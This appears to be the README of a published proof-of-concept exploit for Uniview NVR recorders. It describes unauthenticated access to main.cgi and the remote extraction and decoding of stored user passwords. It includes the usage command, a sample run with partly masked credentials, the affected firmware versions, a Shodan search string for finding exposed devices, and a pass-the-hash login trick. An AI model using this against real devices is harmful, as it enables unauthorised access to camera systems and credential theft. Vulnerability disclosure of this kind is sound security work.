# Uniview NVR remote passwords disclosure

The Uniview NVR web application does not enforce authorizations on the main.cgi file when requesting json data.
It means that you can do anything without authentication, however you must know the request structure.
In addition, the users' passwords are both hashed and also stored in a reversible way
The POC below remotely downloads the device's configuration file, extracts the credentials
and decodes the reversible password strings using my crafted map

It is worth mention that when you login, the javascript hashes the password with MD5 and pass the request.
If the script does retrieve the hash and not the password, you can intercept the request and replace the generated
MD5 with the one disclosed using this script


Tested on the following models:
NVR304-16E - Software Version B3118P26C00510
NVR301-08-P8 - Software Version B3218P26C00512
- version B3220P11
- version B3219P22

 Other versions may also be affected

> Sodan dork for similar devices: "Text.VideoManageSystem"

Usage: python nvr-pwd-disc.py http://Host_or_IP:PORT

Run example:

	root@k4li:~# python nvr-pwd-disc.py http://192.168.1.5
	Uniview NVR remote passwords disclosure!
	Author: B1t0n
	
	[+] Getting model name and software version...
		Model: NVR301-08-P8
 		Software Version: B3218P26C00512

 	[+] Getting configuration file...
 	[+] Number of users found: 4

 	[+] Extracting users' hashes and decoding reversible strings:

 	User 	|	 Hash 	|	 Password
 	_________________________________________________
 	admin 	|	3b9c687b1f4b9d87ed0fdd6a***** 	|	<TRIMMED>
 	default 	|	 	|	||||||||||||||||||||
 	HAUser 	|	288b836a37578141fea6527b5e***** 	|	123HAUser*****
 	test 	|	51b2454c681f3205f63b83720***** 	|	AA123pqrst*****

  	*Note that the users 'default' and 'HAUser' are default and sometimes inaccessible remotely
